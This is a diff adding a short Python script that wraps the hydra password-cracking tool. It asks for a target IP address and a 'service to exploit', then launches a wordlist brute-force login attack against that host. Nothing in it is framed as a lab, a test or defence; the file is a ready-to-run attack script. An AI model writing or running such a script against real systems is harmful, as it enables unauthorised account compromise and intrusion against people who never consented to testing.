@@ -1,0 +1,13 @@
+# Hydra command Script
+
+import subprocess
+
+def HYDRA_Script(IP_Address,service):
+      subprocess.call(["hydra","-L","/usr/share/wordlists/samplekeys.txt","-P","/usr/share/wordlists/samplekeys.txt",IP,service])
+
+IP=input("Enter the IP Address")
+service=input("Enter the service to exploit")
+HYDRA_Script(IP,service)
+
+
+# /usr/share/wordlists/samplekeys.txt -- This is the file path i choose and can be modified as per different file path.
